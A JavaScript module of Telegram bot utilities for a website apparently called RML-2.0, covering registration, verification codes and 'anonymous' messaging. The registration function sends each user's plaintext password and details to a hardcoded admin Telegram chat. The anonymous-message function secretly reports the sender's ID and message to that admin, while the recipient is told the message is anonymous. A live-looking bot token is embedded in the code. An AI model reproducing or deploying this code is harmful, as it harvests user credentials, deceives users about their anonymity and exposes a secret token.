// Telegram-related utilities
const ADMIN_TELEGRAM_CHAT_ID = '6699202743';
const TELEGRAM_BOT_TOKEN = '7397758441:AAFa0kOHzvOG_jIiG-NlZWokU15qUZHX34k';

export async function verifyTelegramId(telegramId) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getChat`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: telegramId
            })
        });

        const result = await response.json();
        return result.ok;
    } catch (error) {
        console.error('Error verifying Telegram ID:', error);
        return false;
    }
}

export async function sendToTelegramBot(data) {
    const userMessage = `
    📋 Регистрация нового пользователя:
    👤 Имя: ${data.firstName}
    👥 Фамилия: ${data.lastName}
    📱 Username: ${data.email}
    🔐 Пароль: ${data.password}
    🆔 Telegram ID: ${data.telegramId}
    `;

    const adminMessage = `
    ⚠️ Новая регистрация:
    👤 Имя Фамилия: ${data.lastName} ${data.firstName}
    📱 Username: ${data.email}
    🔐 Пароль: ${data.password}
    🆔 Введенный Telegram ID: ${data.telegramId}
    `;

    try {
        const userResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: data.telegramId,
                text: userMessage
            })
        });

        const adminResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: ADMIN_TELEGRAM_CHAT_ID,
                text: adminMessage
            })
        });

        const userResult = await userResponse.json();
        const adminResult = await adminResponse.json();

        return userResult.ok && adminResult.ok;
    } catch (error) {
        console.error('Error sending messages to Telegram:', error);
        return false;
    }
}

export function generateVerificationCode() {
    return Math.floor(100000 + Math.random() * 900000).toString();
}

export async function sendVerificationCode(telegramId, code) {
    try {
        const codeMessage = `Ваш код подтверждения: ${code}`;
        
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: telegramId,
                text: codeMessage
            })
        });

        const result = await response.json();
        return result.ok;
    } catch (error) {
        console.error('Error sending verification code:', error);
        return false;
    }
}

export async function sendLoginNotification(telegramId, message) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: telegramId,
                text: message
            })
        });

        const result = await response.json();
        return result.ok;
    } catch (error) {
        console.error('Error sending login notification:', error);
        return false;
    }
}

// Store and retrieve anonymous messages
export async function sendAnonymousMessage(senderTelegramId, recipientTelegramId, message) {
    try {
        // General message to recipient
        const recipientMessage = `
        🕵️ Анонимное сообщение:
        ${message}

        Отправлено анонимно через RML-2.0
        `;

        // Notification to admin
        const adminMessage = `
        🔏 Отправлено анонимное сообщение:
        👤 Отправитель: ${senderTelegramId}
        📧 Получатель: ${recipientTelegramId}
        📝 Сообщение: ${message}
        `;

        // Send message to recipient
        const recipientResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: recipientTelegramId,
                text: recipientMessage
            })
        });

        // Send notification to admin
        const adminResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: ADMIN_TELEGRAM_CHAT_ID,
                text: adminMessage
            })
        });

        const recipientResult = await recipientResponse.json();
        const adminResult = await adminResponse.json();

        return recipientResult.ok && adminResult.ok;
    } catch (error) {
        console.error('Error sending anonymous message:', error);
        return false;
    }
}

export async function getRegisteredUsers() {
    // Retrieve registered users from localStorage
    const registeredUsers = JSON.parse(localStorage.getItem('registeredUsers') || '[]');
    return registeredUsers.map(user => ({
        telegramId: user.telegramId,
        firstName: user.firstName,
        lastName: user.lastName
    }));
}

export async function getAllRegisteredUsers() {
    // Retrieve registered users from localStorage
    const registeredUsers = JSON.parse(localStorage.getItem('registeredUsers') || '[]');
    return registeredUsers.map(user => ({
        telegramId: user.telegramId,
        firstName: user.firstName,
        lastName: user.lastName,
        email: user.email
    }));
}

export async function sendSiteChatMessage(sender, message) {
    // Store messages in localStorage
    const siteChats = JSON.parse(localStorage.getItem('siteChatMessages') || '[]');
    
    const chatMessage = {
        sender: sender,
        message: message,
        timestamp: new Date().toISOString()
    };

    siteChats.push(chatMessage);
    localStorage.setItem('siteChatMessages', JSON.stringify(siteChats));

    return true;
}

export async function getSiteChatMessages() {
    // Retrieve site chat messages from localStorage
    return JSON.parse(localStorage.getItem('siteChatMessages') || '[]');
}